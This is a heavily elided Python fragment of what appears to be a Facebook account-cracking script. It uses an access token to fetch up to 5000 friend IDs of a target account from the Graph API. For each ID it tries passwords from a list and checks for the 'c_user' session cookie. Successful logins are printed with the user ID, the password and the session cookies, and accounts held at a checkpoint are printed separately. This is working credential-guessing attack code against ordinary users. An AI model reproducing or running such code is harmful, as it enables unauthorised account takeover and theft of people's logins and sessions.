...
def publik():
	...
	try:
		...
		for i in requests.get("https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s"%(idt, token)).json()["data"]:
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RESULT-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[RESULT-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[RESULT-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[RESULT-CP] %s|%s\033[0;91m        "%(uid, pw))
